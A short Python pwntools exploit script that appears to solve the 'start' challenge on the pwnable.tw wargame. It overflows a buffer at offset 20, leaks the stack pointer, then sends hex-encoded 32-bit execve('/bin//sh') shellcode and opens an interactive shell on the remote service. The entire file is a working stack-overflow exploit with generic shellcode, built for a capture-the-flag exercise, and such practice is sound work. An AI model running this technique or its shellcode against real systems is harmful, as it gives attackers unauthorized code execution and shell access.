#!/usr/bin/env python
# coding=utf-8

from pwn import *
from binascii import unhexlify

context.clear()
context.update(arch='i386', os='linux', endian='little', word_size=32)
#context.log_level = 'debug'
#log.info(vars(context))

cyclic_offset = 20

#p = process('./start')
p = remote('chall.pwnable.tw', 10000)

p.recvuntil(':')

ret = 0x08048087

p.send(fit({
    cyclic_offset: p32(ret)
    }))

esp = u32(p.recv(1024)[:4])
log.info("Esp: %s" % hex(esp))

# get by `ragg2 -i exec -b 32`
payload = unhexlify('31c050682f2f7368682f62696e89e3505389e199b00b31d2cd80')

p.send(fit({
    cyclic_offset: [p32(esp + 20), payload]
    }))

p.interactive()
